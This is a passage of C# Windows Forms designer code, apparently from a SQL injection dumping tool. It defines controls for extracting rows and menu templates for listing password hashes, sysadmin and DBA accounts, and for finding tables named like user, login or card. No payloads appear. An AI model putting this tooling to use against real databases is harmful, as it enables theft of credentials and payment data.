		this.grbMySQLSplitRows.Name = "grbMySQLSplitRows";
		this.grbMySQLSplitRows.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMySQLSplitRows.Size = new System.Drawing.Size(319, 109);
		this.grbMySQLSplitRows.TabIndex = 44;
		this.grbMySQLSplitRows.TabStop = false;
		this.numMySQLSplitRowsLenght.Enabled = false;
		this.numMySQLSplitRowsLenght.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numMySQLSplitRowsLenght.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numMySQLSplitRowsLenght.Location = new System.Drawing.Point(208, 56);
		this.numMySQLSplitRowsLenght.Minimum = new decimal(new int[4] { 2, 0, 0, 0 });
		this.numMySQLSplitRowsLenght.Name = "numMySQLSplitRowsLenght";
		this.numMySQLSplitRowsLenght.Size = new System.Drawing.Size(105, 26);
		this.numMySQLSplitRowsLenght.TabIndex = 34;
		this.numMySQLSplitRowsLenght.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numMySQLSplitRowsLenght.Value = new decimal(new int[4] { 40, 0, 0, 0 });
		this.Label1.ForeColor = System.Drawing.SystemColors.ControlText;
		this.Label1.Location = new System.Drawing.Point(6, 56);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(194, 26);
		this.Label1.TabIndex = 35;
		this.Label1.Text = "Split Chars Lenght";
		this.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkMySQLSplitRows.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkMySQLSplitRows.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkMySQLSplitRows.Location = new System.Drawing.Point(2, 24);
		this.chkMySQLSplitRows.Name = "chkMySQLSplitRows";
		this.chkMySQLSplitRows.Size = new System.Drawing.Size(196, 25);
		this.chkMySQLSplitRows.TabIndex = 21;
		this.chkMySQLSplitRows.Text = "&Split Rows";
		this.chkMySQLSplitRows.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkMySQLSplitRows.UseVisualStyleBackColor = true;
		this.numMySQLSplitRows.Enabled = false;
		this.numMySQLSplitRows.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numMySQLSplitRows.Location = new System.Drawing.Point(208, 21);
		this.numMySQLSplitRows.Maximum = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numMySQLSplitRows.Minimum = new decimal(new int[4] { 2, 0, 0, 0 });
		this.numMySQLSplitRows.Name = "numMySQLSplitRows";
		this.numMySQLSplitRows.Size = new System.Drawing.Size(105, 26);
		this.numMySQLSplitRows.TabIndex = 22;
		this.numMySQLSplitRows.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numMySQLSplitRows.Value = new decimal(new int[4] { 2, 0, 0, 0 });
		this.grbDumpSetup.Controls.Add(this.numLimitX);
		this.grbDumpSetup.Controls.Add(this.numMaxRetryColumn);
		this.grbDumpSetup.Controls.Add(this.lblDumperRetryColumn);
		this.grbDumpSetup.Controls.Add(this.chkDumpFieldByField);
		this.grbDumpSetup.Controls.Add(this.lblDumperStartIndex);
		this.grbDumpSetup.Controls.Add(this.lblDumperMaxRows);
		this.grbDumpSetup.Controls.Add(this.numFieldByField);
		this.grbDumpSetup.Controls.Add(this.numLimitMax);
		this.grbDumpSetup.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbDumpSetup.Location = new System.Drawing.Point(0, 716);
		this.grbDumpSetup.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbDumpSetup.Name = "grbDumpSetup";
		this.grbDumpSetup.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbDumpSetup.Size = new System.Drawing.Size(319, 178);
		this.grbDumpSetup.TabIndex = 43;
		this.grbDumpSetup.TabStop = false;
		this.numLimitX.Location = new System.Drawing.Point(208, 23);
		this.numLimitX.Maximum = new decimal(new int[4] { -727379969, 232, 0, 0 });
		this.numLimitX.Name = "numLimitX";
		this.numLimitX.Size = new System.Drawing.Size(105, 26);
		this.numLimitX.TabIndex = 15;
		this.numLimitX.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numMaxRetryColumn.Enabled = false;
		this.numMaxRetryColumn.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numMaxRetryColumn.Increment = new decimal(new int[4] { 5, 0, 0, 0 });
		this.numMaxRetryColumn.Location = new System.Drawing.Point(208, 132);
		this.numMaxRetryColumn.Maximum = new decimal(new int[4] { 1000, 0, 0, 0 });
		this.numMaxRetryColumn.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numMaxRetryColumn.Name = "numMaxRetryColumn";
		this.numMaxRetryColumn.Size = new System.Drawing.Size(105, 26);
		this.numMaxRetryColumn.TabIndex = 34;
		this.numMaxRetryColumn.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numMaxRetryColumn.Value = new decimal(new int[4] { 5, 0, 0, 0 });
		this.lblDumperRetryColumn.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblDumperRetryColumn.Location = new System.Drawing.Point(6, 132);
		this.lblDumperRetryColumn.Name = "lblDumperRetryColumn";
		this.lblDumperRetryColumn.Size = new System.Drawing.Size(194, 26);
		this.lblDumperRetryColumn.TabIndex = 35;
		this.lblDumperRetryColumn.Text = "Retry Limit Column";
		this.lblDumperRetryColumn.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpFieldByField.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpFieldByField.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkDumpFieldByField.Location = new System.Drawing.Point(2, 100);
		this.chkDumpFieldByField.Name = "chkDumpFieldByField";
		this.chkDumpFieldByField.Size = new System.Drawing.Size(196, 25);
		this.chkDumpFieldByField.TabIndex = 21;
		this.chkDumpFieldByField.Text = "&Dump Field(s)";
		this.chkDumpFieldByField.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpFieldByField.UseVisualStyleBackColor = true;
		this.lblDumperStartIndex.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblDumperStartIndex.Location = new System.Drawing.Point(24, 23);
		this.lblDumperStartIndex.Name = "lblDumperStartIndex";
		this.lblDumperStartIndex.Size = new System.Drawing.Size(176, 31);
		this.lblDumperStartIndex.TabIndex = 36;
		this.lblDumperStartIndex.Text = "Dump Start Index";
		this.lblDumperStartIndex.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblDumperMaxRows.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblDumperMaxRows.Location = new System.Drawing.Point(22, 58);
		this.lblDumperMaxRows.Name = "lblDumperMaxRows";
		this.lblDumperMaxRows.Size = new System.Drawing.Size(176, 31);
		this.lblDumperMaxRows.TabIndex = 37;
		this.lblDumperMaxRows.Text = "Maximum Rows";
		this.lblDumperMaxRows.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.numFieldByField.Enabled = false;
		this.numFieldByField.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numFieldByField.Location = new System.Drawing.Point(208, 97);
		this.numFieldByField.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numFieldByField.Name = "numFieldByField";
		this.numFieldByField.Size = new System.Drawing.Size(105, 26);
		this.numFieldByField.TabIndex = 22;
		this.numFieldByField.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numFieldByField.Value = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numLimitMax.Location = new System.Drawing.Point(208, 60);
		this.numLimitMax.Maximum = new decimal(new int[4] { -727379969, 232, 0, 0 });
		this.numLimitMax.Name = "numLimitMax";
		this.numLimitMax.Size = new System.Drawing.Size(105, 26);
		this.numLimitMax.TabIndex = 35;
		this.numLimitMax.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.grbOracleCollactions.Controls.Add(this.chkOracleCastAsChar);
		this.grbOracleCollactions.Controls.Add(this.cmbOracleErrType);
		this.grbOracleCollactions.Controls.Add(this.cmbOracleTopN);
		this.grbOracleCollactions.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbOracleCollactions.Location = new System.Drawing.Point(0, 573);
		this.grbOracleCollactions.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbOracleCollactions.Name = "grbOracleCollactions";
		this.grbOracleCollactions.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbOracleCollactions.Size = new System.Drawing.Size(319, 143);
		this.grbOracleCollactions.TabIndex = 40;
		this.grbOracleCollactions.TabStop = false;
		this.grbOracleCollactions.Text = "Illegal Mix Of Collations";
		this.chkOracleCastAsChar.Checked = true;
		this.chkOracleCastAsChar.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkOracleCastAsChar.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.chkOracleCastAsChar.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkOracleCastAsChar.Location = new System.Drawing.Point(8, 105);
		this.chkOracleCastAsChar.Name = "chkOracleCastAsChar";
		this.chkOracleCastAsChar.Size = new System.Drawing.Size(152, 25);
		this.chkOracleCastAsChar.TabIndex = 1;
		this.chkOracleCastAsChar.Text = "Cast As &Char";
		this.chkOracleCastAsChar.UseVisualStyleBackColor = true;
		this.cmbOracleErrType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbOracleErrType.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbOracleErrType.ForeColor = System.Drawing.SystemColors.ControlText;
		this.cmbOracleErrType.FormattingEnabled = true;
		this.cmbOracleErrType.Location = new System.Drawing.Point(8, 66);
		this.cmbOracleErrType.Name = "cmbOracleErrType";
		this.cmbOracleErrType.Size = new System.Drawing.Size(301, 28);
		this.cmbOracleErrType.TabIndex = 36;
		this.cmbOracleTopN.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbOracleTopN.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbOracleTopN.ForeColor = System.Drawing.SystemColors.ControlText;
		this.cmbOracleTopN.FormattingEnabled = true;
		this.cmbOracleTopN.Location = new System.Drawing.Point(8, 28);
		this.cmbOracleTopN.Name = "cmbOracleTopN";
		this.cmbOracleTopN.Size = new System.Drawing.Size(301, 28);
		this.cmbOracleTopN.TabIndex = 34;
		this.grbMSSQLCollactions.Controls.Add(this.chkMSSQLCastAsChar);
		this.grbMSSQLCollactions.Controls.Add(this.cmbMSSQLCast);
		this.grbMSSQLCollactions.Controls.Add(this.chkMSSQL_Latin1);
		this.grbMSSQLCollactions.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbMSSQLCollactions.Location = new System.Drawing.Point(0, 481);
		this.grbMSSQLCollactions.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMSSQLCollactions.Name = "grbMSSQLCollactions";
		this.grbMSSQLCollactions.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMSSQLCollactions.Size = new System.Drawing.Size(319, 92);
		this.grbMSSQLCollactions.TabIndex = 41;
		this.grbMSSQLCollactions.TabStop = false;
		this.grbMSSQLCollactions.Text = "Illegal Mix Of Collations";
		this.chkMSSQLCastAsChar.Checked = true;
		this.chkMSSQLCastAsChar.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkMSSQLCastAsChar.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.chkMSSQLCastAsChar.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkMSSQLCastAsChar.Location = new System.Drawing.Point(8, 55);
		this.chkMSSQLCastAsChar.Name = "chkMSSQLCastAsChar";
		this.chkMSSQLCastAsChar.Size = new System.Drawing.Size(90, 25);
		this.chkMSSQLCastAsChar.TabIndex = 1;
		this.chkMSSQLCastAsChar.Text = "&Cast As";
		this.chkMSSQLCastAsChar.UseVisualStyleBackColor = true;
		this.cmbMSSQLCast.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbMSSQLCast.ForeColor = System.Drawing.SystemColors.ControlText;
		this.cmbMSSQLCast.FormattingEnabled = true;
		this.cmbMSSQLCast.Location = new System.Drawing.Point(132, 46);
		this.cmbMSSQLCast.Name = "cmbMSSQLCast";
		this.cmbMSSQLCast.Size = new System.Drawing.Size(175, 28);
		this.cmbMSSQLCast.TabIndex = 33;
		this.chkMSSQL_Latin1.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.chkMSSQL_Latin1.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkMSSQL_Latin1.Location = new System.Drawing.Point(8, 28);
		this.chkMSSQL_Latin1.Name = "chkMSSQL_Latin1";
		this.chkMSSQL_Latin1.Size = new System.Drawing.Size(118, 25);
		this.chkMSSQL_Latin1.TabIndex = 0;
		this.chkMSSQL_Latin1.Text = "SQL_Latin1";
		this.chkMSSQL_Latin1.UseVisualStyleBackColor = true;
		this.grbMySQLCollactions.Controls.Add(this.cmbMySQLErrType);
		this.grbMySQLCollactions.Controls.Add(this.cmbMySQLCollations);
		this.grbMySQLCollactions.Controls.Add(this.chkDumpIFNULL);
		this.grbMySQLCollactions.Controls.Add(this.chkDumpEncodedHex);
		this.grbMySQLCollactions.Controls.Add(this.chkAllInOneRequest);
		this.grbMySQLCollactions.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbMySQLCollactions.Location = new System.Drawing.Point(0, 283);
		this.grbMySQLCollactions.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMySQLCollactions.Name = "grbMySQLCollactions";
		this.grbMySQLCollactions.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMySQLCollactions.Size = new System.Drawing.Size(319, 198);
		this.grbMySQLCollactions.TabIndex = 39;
		this.grbMySQLCollactions.TabStop = false;
		this.grbMySQLCollactions.Text = "Illegal Mix Of Collations";
		this.cmbMySQLErrType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMySQLErrType.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbMySQLErrType.ForeColor = System.Drawing.SystemColors.ControlText;
		this.cmbMySQLErrType.FormattingEnabled = true;
		this.cmbMySQLErrType.Location = new System.Drawing.Point(8, 66);
		this.cmbMySQLErrType.Name = "cmbMySQLErrType";
		this.cmbMySQLErrType.Size = new System.Drawing.Size(301, 28);
		this.cmbMySQLErrType.TabIndex = 35;
		this.cmbMySQLCollations.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMySQLCollations.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbMySQLCollations.ForeColor = System.Drawing.SystemColors.ControlText;
		this.cmbMySQLCollations.FormattingEnabled = true;
		this.cmbMySQLCollations.Location = new System.Drawing.Point(8, 28);
		this.cmbMySQLCollations.Name = "cmbMySQLCollations";
		this.cmbMySQLCollations.Size = new System.Drawing.Size(301, 28);
		this.cmbMySQLCollations.TabIndex = 34;
		this.chkDumpIFNULL.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpIFNULL.Checked = true;
		this.chkDumpIFNULL.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkDumpIFNULL.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkDumpIFNULL.Location = new System.Drawing.Point(10, 105);
		this.chkDumpIFNULL.Name = "chkDumpIFNULL";
		this.chkDumpIFNULL.Size = new System.Drawing.Size(299, 24);
		this.chkDumpIFNULL.TabIndex = 32;
		this.chkDumpIFNULL.Text = "&Dump Rows &IFNULL";
		this.chkDumpIFNULL.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpIFNULL.UseVisualStyleBackColor = true;
		this.chkDumpEncodedHex.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpEncodedHex.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkDumpEncodedHex.Location = new System.Drawing.Point(10, 131);
		this.chkDumpEncodedHex.Name = "chkDumpEncodedHex";
		this.chkDumpEncodedHex.Size = new System.Drawing.Size(299, 24);
		this.chkDumpEncodedHex.TabIndex = 23;
		this.chkDumpEncodedHex.Text = "&Dump Rows &Hex Encoded";
		this.chkDumpEncodedHex.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpEncodedHex.UseVisualStyleBackColor = true;
		this.chkAllInOneRequest.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkAllInOneRequest.Checked = true;
		this.chkAllInOneRequest.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkAllInOneRequest.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.chkAllInOneRequest.Location = new System.Drawing.Point(10, 157);
		this.chkAllInOneRequest.Name = "chkAllInOneRequest";
		this.chkAllInOneRequest.Size = new System.Drawing.Size(299, 24);
		this.chkAllInOneRequest.TabIndex = 0;
		this.chkAllInOneRequest.Text = "All In One";
		this.chkAllInOneRequest.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkAllInOneRequest.UseVisualStyleBackColor = true;
		this.grbSetupCon.Controls.Add(this.chkHttpRedirect);
		this.grbSetupCon.Controls.Add(this.numSleep);
		this.grbSetupCon.Controls.Add(this.numSleepMultiThread);
		this.grbSetupCon.Controls.Add(this.numMaxRetry);
		this.grbSetupCon.Controls.Add(this.chkThreads);
		this.grbSetupCon.Controls.Add(this.numMaxRetryMultiThread);
		this.grbSetupCon.Controls.Add(this.numThreads);
		this.grbSetupCon.Controls.Add(this.numTimeOut);
		this.grbSetupCon.Controls.Add(this.lblThreadDelay);
		this.grbSetupCon.Controls.Add(this.lblThreadRetry);
		this.grbSetupCon.Controls.Add(this.lblMultiThreadDelay);
		this.grbSetupCon.Controls.Add(this.lblMultiThreadRetry);
		this.grbSetupCon.Controls.Add(this.lblTimout);
		this.grbSetupCon.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbSetupCon.Location = new System.Drawing.Point(0, 0);
		this.grbSetupCon.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbSetupCon.Name = "grbSetupCon";
		this.grbSetupCon.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbSetupCon.Size = new System.Drawing.Size(319, 283);
		this.grbSetupCon.TabIndex = 42;
		this.grbSetupCon.TabStop = false;
		this.chkHttpRedirect.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkHttpRedirect.Checked = true;
		this.chkHttpRedirect.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkHttpRedirect.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.chkHttpRedirect.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkHttpRedirect.Location = new System.Drawing.Point(10, 246);
		this.chkHttpRedirect.Name = "chkHttpRedirect";
		this.chkHttpRedirect.Size = new System.Drawing.Size(303, 25);
		this.chkHttpRedirect.TabIndex = 29;
		this.chkHttpRedirect.Text = "HTTP Follow Redirect";
		this.chkHttpRedirect.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkHttpRedirect.UseVisualStyleBackColor = true;
		this.chkThreads.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkThreads.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkThreads.Location = new System.Drawing.Point(10, 31);
		this.chkThreads.Name = "chkThreads";
		this.chkThreads.Size = new System.Drawing.Size(191, 25);
		this.chkThreads.TabIndex = 23;
		this.chkThreads.Text = "Multi-Thread";
		this.chkThreads.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkThreads.UseVisualStyleBackColor = true;
		this.numThreads.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numThreads.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numThreads.Location = new System.Drawing.Point(208, 29);
		this.numThreads.Maximum = new decimal(new int[4] { 200, 0, 0, 0 });
		this.numThreads.Minimum = new decimal(new int[4] { 2, 0, 0, 0 });
		this.numThreads.Name = "numThreads";
		this.numThreads.Size = new System.Drawing.Size(105, 26);
		this.numThreads.TabIndex = 24;
		this.numThreads.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numThreads.Value = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numTimeOut.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numTimeOut.Increment = new decimal(new int[4] { 5, 0, 0, 0 });
		this.numTimeOut.Location = new System.Drawing.Point(208, 65);
		this.numTimeOut.Maximum = new decimal(new int[4] { 60, 0, 0, 0 });
		this.numTimeOut.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numTimeOut.Name = "numTimeOut";
		this.numTimeOut.Size = new System.Drawing.Size(105, 26);
		this.numTimeOut.TabIndex = 10;
		this.numTimeOut.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numTimeOut.Value = new decimal(new int[4] { 10, 0, 0, 0 });
		this.lblTimout.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblTimout.Location = new System.Drawing.Point(6, 65);
		this.lblTimout.Name = "lblTimout";
		this.lblTimout.Size = new System.Drawing.Size(195, 29);
		this.lblTimout.TabIndex = 0;
		this.lblTimout.Text = "&TimeOut (sec)";
		this.lblTimout.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.splData.Dock = System.Windows.Forms.DockStyle.Fill;
		this.splData.FixedPanel = System.Windows.Forms.FixedPanel.Panel1;
		this.splData.Location = new System.Drawing.Point(0, 66);
		this.splData.Name = "splData";
		this.splData.Orientation = System.Windows.Forms.Orientation.Horizontal;
		this.splData.Panel1.Controls.Add(this.tbcMain);
		this.splData.Panel1.Controls.Add(this.pnlSetupDump);
		this.splData.Panel2.AutoScroll = true;
		this.splData.Panel2.AutoScrollMinSize = new System.Drawing.Size(0, 200);
		this.splData.Size = new System.Drawing.Size(1762, 1386);
		this.splData.SplitterDistance = 1286;
		this.splData.SplitterWidth = 5;
		this.splData.TabIndex = 19;
		this.ctmTemplatesPostgreSQL.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.ctmTemplatesPostgreSQL.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.mnuPostgreSQL_ListUsers, this.mnuPostgreSQL_Passwords, this.mnuPostgreSQL_Join });
		this.ctmTemplatesPostgreSQL.Name = "mnuListView";
		this.ctmTemplatesPostgreSQL.ShowImageMargin = false;
		this.ctmTemplatesPostgreSQL.Size = new System.Drawing.Size(228, 94);
		this.mnuPostgreSQL_ListUsers.Name = "mnuPostgreSQL_ListUsers";
		this.mnuPostgreSQL_ListUsers.Size = new System.Drawing.Size(227, 30);
		this.mnuPostgreSQL_ListUsers.Text = "List Users";
		this.mnuPostgreSQL_Passwords.Name = "mnuPostgreSQL_Passwords";
		this.mnuPostgreSQL_Passwords.Size = new System.Drawing.Size(227, 30);
		this.mnuPostgreSQL_Passwords.Text = "List Password Hashes";
		this.mnuPostgreSQL_Join.Name = "mnuPostgreSQL_Join";
		this.mnuPostgreSQL_Join.Size = new System.Drawing.Size(227, 30);
		this.mnuPostgreSQL_Join.Text = "JOIN Example";
		this.ctmTemplatesOracle.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.ctmTemplatesOracle.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.mnuOracleListUsers, this.mnuOracleHashes, this.mnuOracleJoin, this.ToolStripSeparator24, this.mnuOracleHelp });
		this.ctmTemplatesOracle.Name = "mnuListView";
		this.ctmTemplatesOracle.ShowImageMargin = false;
		this.ctmTemplatesOracle.Size = new System.Drawing.Size(228, 130);
		this.mnuOracleListUsers.Name = "mnuOracleListUsers";
		this.mnuOracleListUsers.Size = new System.Drawing.Size(227, 30);
		this.mnuOracleListUsers.Text = "List Users";
		this.mnuOracleHashes.Name = "mnuOracleHashes";
		this.mnuOracleHashes.Size = new System.Drawing.Size(227, 30);
		this.mnuOracleHashes.Text = "List Password Hashes";
		this.mnuOracleJoin.Name = "mnuOracleJoin";
		this.mnuOracleJoin.Size = new System.Drawing.Size(227, 30);
		this.mnuOracleJoin.Text = "JOIN Example";
		this.mnuOracleJoin.Visible = false;
		this.ToolStripSeparator24.Name = "ToolStripSeparator24";
		this.ToolStripSeparator24.Size = new System.Drawing.Size(224, 6);
		this.mnuOracleHelp.Name = "mnuOracleHelp";
		this.mnuOracleHelp.Size = new System.Drawing.Size(227, 30);
		this.mnuOracleHelp.Text = "Help";
		this.ctmTemplatesMSSQL.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.ctmTemplatesMSSQL.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.mnuSqlLogins, this.mnuSqlIsAdmin, this.mnuSQLJoin, this.ToolStripMenuItem1, this.mnuSQLHelp });
		this.ctmTemplatesMSSQL.Name = "mnuListView";
		this.ctmTemplatesMSSQL.ShowImageMargin = false;
		this.ctmTemplatesMSSQL.Size = new System.Drawing.Size(223, 130);
		this.mnuSqlLogins.Name = "mnuSqlLogins";
		this.mnuSqlLogins.Size = new System.Drawing.Size(222, 30);
		this.mnuSqlLogins.Text = "List Users";
		this.mnuSqlIsAdmin.Name = "mnuSqlIsAdmin";
		this.mnuSqlIsAdmin.Size = new System.Drawing.Size(222, 30);
		this.mnuSqlIsAdmin.Text = "Account Is sysadmin";
		this.mnuSQLJoin.Name = "mnuSQLJoin";
		this.mnuSQLJoin.Size = new System.Drawing.Size(222, 30);
		this.mnuSQLJoin.Text = "JOIN Example";
		this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
		this.ToolStripMenuItem1.Size = new System.Drawing.Size(219, 6);
		this.mnuSQLHelp.Name = "mnuSQLHelp";
		this.mnuSQLHelp.Size = new System.Drawing.Size(222, 30);
		this.mnuSQLHelp.Text = "Help";
		this.bckWorker.WorkerReportsProgress = true;
		this.bckWorker.WorkerSupportsCancellation = true;
		this.tlpUrl.AutoPopDelay = 5000;
		this.tlpUrl.InitialDelay = 500;
		this.tlpUrl.ReshowDelay = 100;
		this.tlpUrl.ShowAlways = true;
		this.tlpUrl.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
		this.tlpUrl.ToolTipTitle = "Info";
		this.ctmTemplatesFilters.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.ctmTemplatesFilters.Items.AddRange(new System.Windows.Forms.ToolStripItem[10] { this.mnuFilters1, this.mnuFilters2, this.mnuFilters5, this.mnuFilters6, this.mnuFilters7, this.mnuFilters8, this.mnuFilters9, this.mnuFilters10, this.mnuFilters3, this.ToolStripMenuItem12 });
		this.ctmTemplatesFilters.Name = "mnuListView";
		this.ctmTemplatesFilters.ShowImageMargin = false;
		this.ctmTemplatesFilters.Size = new System.Drawing.Size(294, 304);
		this.mnuFilters1.Name = "mnuFilters1";
		this.mnuFilters1.Size = new System.Drawing.Size(293, 30);
		this.mnuFilters1.Text = "WHERE current DataBase()";
		this.mnuFilters2.Name = "mnuFilters2";
		this.mnuFilters2.Size = new System.Drawing.Size(293, 30);
		this.mnuFilters2.Text = "LIKE table name %user%";
		this.mnuFilters5.Name = "mnuFilters5";
		this.mnuFilters5.Size = new System.Drawing.Size(293, 30);
		this.mnuFilters5.Text = "LIKE table name %admin%";
		this.mnuFilters6.Name = "mnuFilters6";
		this.mnuFilters6.Size = new System.Drawing.Size(293, 30);
		this.mnuFilters6.Text = "LIKE table name %login%";
		this.mnuFilters7.Name = "mnuFilters7";
		this.mnuFilters7.Size = new System.Drawing.Size(293, 30);
		this.mnuFilters7.Text = "LIKE table name %customer%";
		this.mnuFilters8.Name = "mnuFilters8";
		this.mnuFilters8.Size = new System.Drawing.Size(293, 30);
		this.mnuFilters8.Text = "LIKE table name %sale%";
		this.mnuFilters9.Name = "mnuFilters9";
		this.mnuFilters9.Size = new System.Drawing.Size(293, 30);
		this.mnuFilters9.Text = "LIKE table name %mail%";
		this.mnuFilters10.Name = "mnuFilters10";
		this.mnuFilters10.Size = new System.Drawing.Size(293, 30);
		this.mnuFilters10.Text = "LIKE table name %card%";
		this.mnuFilters3.Name = "mnuFilters3";
		this.mnuFilters3.Size = new System.Drawing.Size(293, 30);
		this.mnuFilters3.Text = "WHERE NOT column IS NULL";
		this.ctmTemplatesMySQL.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.ctmTemplatesMySQL.Items.AddRange(new System.Windows.Forms.ToolStripItem[16]
		{
			this.mnuUsers, this.mnuPrivileges, this.mnuListDBA, this.mnuHostIP, this.mnuExtraMySQLStuffs2, this.mnuLoadFile, this.mnuIntoOutfile, this.mnuIntoDumpfile, this.mnuExtraMySQLStuffs, this.mnuCheckUser,
			this.mnuCheckPizza, this.mnuJOIN, this.mnuLENGTH, this.mnuLimitXY, this.ToolStripSeparator34, this.mnuMySQLHelp
		});
		this.ctmTemplatesMySQL.Name = "mnuListView";
		this.ctmTemplatesMySQL.ShowImageMargin = false;
		this.ctmTemplatesMySQL.ShowItemToolTips = false;
		this.ctmTemplatesMySQL.Size = new System.Drawing.Size(395, 460);
		this.mnuUsers.Name = "mnuUsers";
		this.mnuUsers.Size = new System.Drawing.Size(394, 30);
		this.mnuUsers.Text = "MySQL Users Passwords Hashes";
		this.mnuPrivileges.Name = "mnuPrivileges";
		this.mnuPrivileges.Size = new System.Drawing.Size(394, 30);
		this.mnuPrivileges.Text = "List Privileges";
		this.mnuListDBA.Name = "mnuListDBA";
		this.mnuListDBA.Size = new System.Drawing.Size(394, 30);
		this.mnuListDBA.Text = "List DBA Accounts";
		this.mnuHostIP.Name = "mnuHostIP";
		this.mnuHostIP.Size = new System.Drawing.Size(394, 30);
		this.mnuHostIP.Text = "Hostname, Data Dir";
		this.mnuExtraMySQLStuffs2.Name = "mnuExtraMySQLStuffs2";
		this.mnuExtraMySQLStuffs2.Size = new System.Drawing.Size(394, 30);
